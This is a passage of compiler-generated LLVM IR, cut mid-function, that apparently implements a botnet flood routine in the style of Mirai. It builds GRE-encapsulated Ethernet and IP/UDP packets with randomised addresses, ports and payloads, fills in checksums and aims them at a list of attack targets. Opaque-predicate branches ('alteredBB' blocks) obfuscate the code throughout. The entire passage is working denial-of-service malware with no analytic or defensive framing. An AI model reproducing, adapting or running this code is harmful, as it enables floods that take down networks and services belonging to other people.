  br i1 %135, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %127
  store i32 0, i32* %17, align 4
  %136 = load i32, i32* @x.21
  %137 = load i32, i32* @y.22
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %144

; <label>:144:                                    ; preds = %originalBBpart268, %originalBBpart28
  %145 = load i32, i32* %17, align 4
  %146 = load i8, i8* %13, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp slt i32 %145, %147
  br i1 %148, label %149, label %351

; <label>:149:                                    ; preds = %144
  %150 = load i32, i32* @x.21
  %151 = load i32, i32* @y.22
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %149
  %158 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %159 = load i8**, i8*** %19, align 8
  %160 = load i32, i32* %17, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8*, i8** %159, i64 %161
  store i8* %158, i8** %162, align 8
  %163 = load i8**, i8*** %19, align 8
  %164 = load i32, i32* %17, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds i8*, i8** %163, i64 %165
  %167 = load i8*, i8** %166, align 8
  %168 = bitcast i8* %167 to %struct.iphdr*
  store %struct.iphdr* %168, %struct.iphdr** %30, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i64 1
  %171 = bitcast %struct.iphdr* %170 to %struct.grehdr*
  store %struct.grehdr* %171, %struct.grehdr** %31, align 8
  %172 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %173 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %172, i64 1
  %174 = bitcast %struct.grehdr* %173 to %struct.ethhdr*
  store %struct.ethhdr* %174, %struct.ethhdr** %32, align 8
  %175 = load %struct.ethhdr*, %struct.ethhdr** %32, align 8
  %176 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %175, i64 1
  %177 = bitcast %struct.ethhdr* %176 to %struct.iphdr*
  store %struct.iphdr* %177, %struct.iphdr** %33, align 8
  %178 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i64 1
  %180 = bitcast %struct.iphdr* %179 to %struct.udphdr*
  store %struct.udphdr* %180, %struct.udphdr** %34, align 8
  %181 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %182 = bitcast %struct.iphdr* %181 to i8*
  %183 = load i8, i8* %182, align 4
  %184 = and i8 %183, 15
  %185 = or i8 %184, 64
  store i8 %185, i8* %182, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %187 = bitcast %struct.iphdr* %186 to i8*
  %188 = load i8, i8* %187, align 4
  %189 = and i8 %188, -16
  %190 = or i8 %189, 5
  store i8 %190, i8* %187, align 4
  %191 = load i8, i8* %20, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 1
  store i8 %191, i8* %193, align 1
  %194 = load i32, i32* %26, align 4
  %195 = sext i32 %194 to i64
  %196 = add i64 66, %195
  %197 = trunc i64 %196 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 2
  store i16 %198, i16* %200, align 2
  %201 = load i16, i16* %21, align 2
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 3
  store i16 %202, i16* %204, align 4
  %205 = load i8, i8* %22, align 1
  %206 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 5
  store i8 %205, i8* %207, align 4
  %208 = load i8, i8* %23, align 1
  %209 = icmp ne i8 %208, 0
  %210 = load i32, i32* @x.21
  %211 = load i32, i32* @y.22
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart250, label %originalBB10alteredBB

originalBBpart250:                                ; preds = %originalBB10
  br i1 %209, label %218, label %222

; <label>:218:                                    ; preds = %originalBBpart250
  %219 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %220 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 4
  store i16 %219, i16* %221, align 2
  br label %222

; <label>:222:                                    ; preds = %218, %originalBBpart250
  %223 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 6
  store i8 47, i8* %224, align 1
  %225 = load i32, i32* %29, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 8
  store i32 %225, i32* %227, align 4
  %228 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %229 = load i32, i32* %17, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %228, i64 %230
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %231, i32 0, i32 1
  %233 = load i32, i32* %232, align 4
  %234 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  %236 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %237 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %238 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %237, i32 0, i32 1
  store i16 %236, i16* %238, align 2
  %239 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %240 = load %struct.ethhdr*, %struct.ethhdr** %32, align 8
  %241 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %240, i32 0, i32 2
  store i16 %239, i16* %241, align 1
  %242 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %243 = bitcast %struct.iphdr* %242 to i8*
  %244 = load i8, i8* %243, align 4
  %245 = and i8 %244, 15
  %246 = or i8 %245, 64
  store i8 %246, i8* %243, align 4
  %247 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %248 = bitcast %struct.iphdr* %247 to i8*
  %249 = load i8, i8* %248, align 4
  %250 = and i8 %249, -16
  %251 = or i8 %250, 5
  store i8 %251, i8* %248, align 4
  %252 = load i8, i8* %20, align 1
  %253 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %254 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %253, i32 0, i32 1
  store i8 %252, i8* %254, align 1
  %255 = load i32, i32* %26, align 4
  %256 = sext i32 %255 to i64
  %257 = add i64 28, %256
  %258 = trunc i64 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #7
  %260 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 2
  store i16 %259, i16* %261, align 2
  %262 = load i16, i16* %21, align 2
  %263 = zext i16 %262 to i32
  %264 = xor i32 %263, -1
  %265 = trunc i32 %264 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #7
  %267 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 3
  store i16 %266, i16* %268, align 4
  %269 = load i8, i8* %22, align 1
  %270 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 5
  store i8 %269, i8* %271, align 4
  %272 = load i8, i8* %23, align 1
  %273 = icmp ne i8 %272, 0
  br i1 %273, label %274, label %294

; <label>:274:                                    ; preds = %222
  %275 = load i32, i32* @x.21
  %276 = load i32, i32* @y.22
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %274
  %283 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %284 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 4
  store i16 %283, i16* %285, align 2
  %286 = load i32, i32* @x.21
  %287 = load i32, i32* @y.22
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %294

; <label>:294:                                    ; preds = %originalBBpart254, %222
  %295 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 6
  store i8 17, i8* %296, align 1
  %297 = call i32 @rand_next()
  %298 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %299 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %298, i32 0, i32 8
  store i32 %297, i32* %299, align 4
  %300 = load i8, i8* %28, align 1
  %301 = icmp ne i8 %300, 0
  br i1 %301, label %302, label %308

; <label>:302:                                    ; preds = %294
  %303 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 9
  %305 = load i32, i32* %304, align 4
  %306 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %307 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %306, i32 0, i32 9
  store i32 %305, i32* %307, align 4
  br label %316

; <label>:308:                                    ; preds = %294
  %309 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 8
  %311 = load i32, i32* %310, align 4
  %312 = sub i32 %311, 1024
  %313 = xor i32 %312, -1
  %314 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 9
  store i32 %313, i32* %315, align 4
  br label %316

; <label>:316:                                    ; preds = %308, %302
  %317 = load i16, i16* %24, align 2
  %318 = call zeroext i16 @htons(i16 zeroext %317) #7
  %319 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %320 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %319, i32 0, i32 0
  store i16 %318, i16* %320, align 2
  %321 = load i16, i16* %25, align 2
  %322 = call zeroext i16 @htons(i16 zeroext %321) #7
  %323 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 1
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %26, align 4
  %326 = sext i32 %325 to i64
  %327 = add i64 8, %326
  %328 = trunc i64 %327 to i16
  %329 = call zeroext i16 @htons(i16 zeroext %328) #7
  %330 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %331 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %330, i32 0, i32 2
  store i16 %329, i16* %331, align 2
  br label %332

; <label>:332:                                    ; preds = %316
  %333 = load i32, i32* @x.21
  %334 = load i32, i32* @y.22
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %332
  %341 = load i32, i32* %17, align 4
  %342 = add nsw i32 %341, 1
  store i32 %342, i32* %17, align 4
  %343 = load i32, i32* @x.21
  %344 = load i32, i32* @y.22
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBBpart268, label %originalBB56alteredBB

originalBBpart268:                                ; preds = %originalBB56
  br label %144

; <label>:351:                                    ; preds = %144
  %352 = load i32, i32* @x.21
  %353 = load i32, i32* @y.22
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %351
  %360 = load i32, i32* @x.21
  %361 = load i32, i32* @y.22
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %368

; <label>:368:                                    ; preds = %695, %originalBBpart272
  store i32 0, i32* %17, align 4
  br label %369

; <label>:369:                                    ; preds = %originalBBpart2115, %368
  %370 = load i32, i32* %17, align 4
  %371 = load i8, i8* %13, align 1
  %372 = zext i8 %371 to i32
  %373 = icmp slt i32 %370, %372
  br i1 %373, label %374, label %695

; <label>:374:                                    ; preds = %369
  %375 = load i32, i32* @x.21
  %376 = load i32, i32* @y.22
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %374
  %383 = load i8**, i8*** %19, align 8
  %384 = load i32, i32* %17, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds i8*, i8** %383, i64 %385
  %387 = load i8*, i8** %386, align 8
  store i8* %387, i8** %38, align 8
  %388 = load i8*, i8** %38, align 8
  %389 = bitcast i8* %388 to %struct.iphdr*
  store %struct.iphdr* %389, %struct.iphdr** %39, align 8
  %390 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %391 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %390, i64 1
  %392 = bitcast %struct.iphdr* %391 to %struct.grehdr*
  store %struct.grehdr* %392, %struct.grehdr** %40, align 8
  %393 = load %struct.grehdr*, %struct.grehdr** %40, align 8
  %394 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %393, i64 1
  %395 = bitcast %struct.grehdr* %394 to %struct.ethhdr*
  store %struct.ethhdr* %395, %struct.ethhdr** %41, align 8
  %396 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %397 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %396, i64 1
  %398 = bitcast %struct.ethhdr* %397 to %struct.iphdr*
  store %struct.iphdr* %398, %struct.iphdr** %42, align 8
  %399 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %400 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %399, i64 1
  %401 = bitcast %struct.iphdr* %400 to %struct.udphdr*
  store %struct.udphdr* %401, %struct.udphdr** %43, align 8
  %402 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %403 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %402, i64 1
  %404 = bitcast %struct.udphdr* %403 to i8*
  store i8* %404, i8** %44, align 8
  %405 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %406 = load i32, i32* %17, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %405, i64 %407
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %408, i32 0, i32 2
  %410 = load i8, i8* %409, align 4
  %411 = zext i8 %410 to i32
  %412 = icmp slt i32 %411, 32
  %413 = load i32, i32* @x.21
  %414 = load i32, i32* @y.22
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %412, label %421, label %442

; <label>:421:                                    ; preds = %originalBBpart276
  %422 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %423 = load i32, i32* %17, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %425, i32 0, i32 1
  %427 = load i32, i32* %426, align 4
  %428 = call i32 @ntohl(i32 %427) #7
  %429 = call i32 @rand_next()
  %430 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %431 = load i32, i32* %17, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i64 %432
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %433, i32 0, i32 2
  %435 = load i8, i8* %434, align 4
  %436 = zext i8 %435 to i32
  %437 = lshr i32 %429, %436
  %438 = add i32 %428, %437
  %439 = call i32 @htonl(i32 %438) #7
  %440 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i32 0, i32 9
  store i32 %439, i32* %441, align 4
  br label %442

; <label>:442:                                    ; preds = %421, %originalBBpart276
  %443 = load i32, i32* %29, align 4
  %444 = icmp eq i32 %443, -1
  br i1 %444, label %445, label %465

; <label>:445:                                    ; preds = %442
  %446 = load i32, i32* @x.21
  %447 = load i32, i32* @y.22
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %445
  %454 = call i32 @rand_next()
  %455 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %456 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %455, i32 0, i32 8
  store i32 %454, i32* %456, align 4
  %457 = load i32, i32* @x.21
  %458 = load i32, i32* @y.22
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %465

; <label>:465:                                    ; preds = %originalBBpart280, %442
  %466 = load i16, i16* %21, align 2
  %467 = zext i16 %466 to i32
  %468 = icmp eq i32 %467, 65535
  br i1 %468, label %469, label %484

; <label>:469:                                    ; preds = %465
  %470 = call i32 @rand_next()
  %471 = and i32 %470, 65535
  %472 = trunc i32 %471 to i16
  %473 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 3
  store i16 %472, i16* %474, align 4
  %475 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i32 0, i32 3
  %477 = load i16, i16* %476, align 4
  %478 = zext i16 %477 to i32
  %479 = sub nsw i32 %478, 1000
  %480 = xor i32 %479, -1
  %481 = trunc i32 %480 to i16
  %482 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %483 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %482, i32 0, i32 3
  store i16 %481, i16* %483, align 4
  br label %484

; <label>:484:                                    ; preds = %469, %465
  %485 = load i32, i32* @x.21
  %486 = load i32, i32* @y.22
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %484
  %493 = load i16, i16* %24, align 2
  %494 = zext i16 %493 to i32
  %495 = icmp eq i32 %494, 65535
  %496 = load i32, i32* @x.21
  %497 = load i32, i32* @y.22
  %498 = sub i32 %496, 1
  %499 = mul i32 %496, %498
  %500 = urem i32 %499, 2
  %501 = icmp eq i32 %500, 0
  %502 = icmp slt i32 %497, 10
  %503 = or i1 %501, %502
  br i1 %503, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %495, label %504, label %510

; <label>:504:                                    ; preds = %originalBBpart284
  %505 = call i32 @rand_next()
  %506 = and i32 %505, 65535
  %507 = trunc i32 %506 to i16
  %508 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %509 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %508, i32 0, i32 0
  store i16 %507, i16* %509, align 2
  br label %510

; <label>:510:                                    ; preds = %504, %originalBBpart284
  %511 = load i16, i16* %25, align 2
  %512 = zext i16 %511 to i32
  %513 = icmp eq i32 %512, 65535
  br i1 %513, label %514, label %536

; <label>:514:                                    ; preds = %510
  %515 = load i32, i32* @x.21
  %516 = load i32, i32* @y.22
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %514
  %523 = call i32 @rand_next()
  %524 = and i32 %523, 65535
  %525 = trunc i32 %524 to i16
  %526 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %527 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %526, i32 0, i32 1
  store i16 %525, i16* %527, align 2
  %528 = load i32, i32* @x.21
  %529 = load i32, i32* @y.22
  %530 = sub i32 %528, 1
  %531 = mul i32 %528, %530
  %532 = urem i32 %531, 2
  %533 = icmp eq i32 %532, 0
  %534 = icmp slt i32 %529, 10
  %535 = or i1 %533, %534
  br i1 %535, label %originalBBpart291, label %originalBB86alteredBB

originalBBpart291:                                ; preds = %originalBB86
  br label %536

; <label>:536:                                    ; preds = %originalBBpart291, %510
  %537 = load i32, i32* @x.21
  %538 = load i32, i32* @y.22
  %539 = sub i32 %537, 1
  %540 = mul i32 %537, %539
  %541 = urem i32 %540, 2
  %542 = icmp eq i32 %541, 0
  %543 = icmp slt i32 %538, 10
  %544 = or i1 %542, %543
  br i1 %544, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %536
  %545 = load i8, i8* %28, align 1
  %546 = icmp ne i8 %545, 0
  %547 = load i32, i32* @x.21
  %548 = load i32, i32* @y.22
  %549 = sub i32 %547, 1
  %550 = mul i32 %547, %549
  %551 = urem i32 %550, 2
  %552 = icmp eq i32 %551, 0
  %553 = icmp slt i32 %548, 10
  %554 = or i1 %552, %553
  br i1 %554, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br i1 %546, label %559, label %555

; <label>:555:                                    ; preds = %originalBBpart295
  %556 = call i32 @rand_next()
  %557 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %558 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %557, i32 0, i32 9
  store i32 %556, i32* %558, align 4
  br label %565

; <label>:559:                                    ; preds = %originalBBpart295
  %560 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %561 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %560, i32 0, i32 9
  %562 = load i32, i32* %561, align 4
  %563 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %564 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %563, i32 0, i32 9
  store i32 %562, i32* %564, align 4
  br label %565

; <label>:565:                                    ; preds = %559, %555
  %566 = load i32, i32* @x.21
  %567 = load i32, i32* @y.22
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %565
  %574 = call i32 @rand_next()
  store i32 %574, i32* %45, align 4
  %575 = call i32 @rand_next()
  store i32 %575, i32* %46, align 4
  %576 = call i32 @rand_next()
  store i32 %576, i32* %47, align 4
  %577 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %578 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %577, i32 0, i32 0
  %579 = getelementptr inbounds [6 x i8], [6 x i8]* %578, i32 0, i32 0
  %580 = bitcast i32* %45 to i8*
  call void @util_memcpy(i8* %579, i8* %580, i32 4)
  %581 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %582 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %581, i32 0, i32 1
  %583 = getelementptr inbounds [6 x i8], [6 x i8]* %582, i32 0, i32 0
  %584 = bitcast i32* %46 to i8*
  call void @util_memcpy(i8* %583, i8* %584, i32 4)
  %585 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %586 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %585, i32 0, i32 0
  %587 = getelementptr inbounds [6 x i8], [6 x i8]* %586, i32 0, i32 0
  %588 = getelementptr inbounds i8, i8* %587, i64 4
  %589 = bitcast i32* %47 to i8*
  call void @util_memcpy(i8* %588, i8* %589, i32 2)
  %590 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %591 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %590, i32 0, i32 1
  %592 = getelementptr inbounds [6 x i8], [6 x i8]* %591, i32 0, i32 0
  %593 = getelementptr inbounds i8, i8* %592, i64 4
  %594 = bitcast i32* %47 to i8*
  %595 = getelementptr inbounds i8, i8* %594, i64 2
  call void @util_memcpy(i8* %593, i8* %595, i32 2)
  %596 = load i8, i8* %27, align 1
  %597 = icmp ne i8 %596, 0
  %598 = load i32, i32* @x.21
  %599 = load i32, i32* @y.22
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br i1 %597, label %606, label %609

; <label>:606:                                    ; preds = %originalBBpart299
  %607 = load i8*, i8** %44, align 8
  %608 = load i32, i32* %26, align 4
  call void @rand_str(i8* %607, i32 %608)
  br label %609

; <label>:609:                                    ; preds = %606, %originalBBpart299
  %610 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %611 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %610, i32 0, i32 7
  store i16 0, i16* %611, align 2
  %612 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %613 = bitcast %struct.iphdr* %612 to i16*
  %614 = call zeroext i16 @checksum_generic(i16* %613, i32 20)
  %615 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %616 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %615, i32 0, i32 7
  store i16 %614, i16* %616, align 2
  %617 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %618 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %617, i32 0, i32 7
  store i16 0, i16* %618, align 2
  %619 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %620 = bitcast %struct.iphdr* %619 to i16*
  %621 = call zeroext i16 @checksum_generic(i16* %620, i32 20)
  %622 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %623 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %622, i32 0, i32 7
  store i16 %621, i16* %623, align 2
  %624 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %625 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %624, i32 0, i32 3
  store i16 0, i16* %625, align 2
  %626 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %627 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %628 = bitcast %struct.udphdr* %627 to i8*
  %629 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %630 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %629, i32 0, i32 2
  %631 = load i16, i16* %630, align 2
  %632 = load i32, i32* %26, align 4
  %633 = sext i32 %632 to i64
  %634 = add i64 8, %633
  %635 = trunc i64 %634 to i32
  %636 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %626, i8* %628, i16 zeroext %631, i32 %635)
  %637 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %638 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %637, i32 0, i32 3
  store i16 %636, i16* %638, align 2
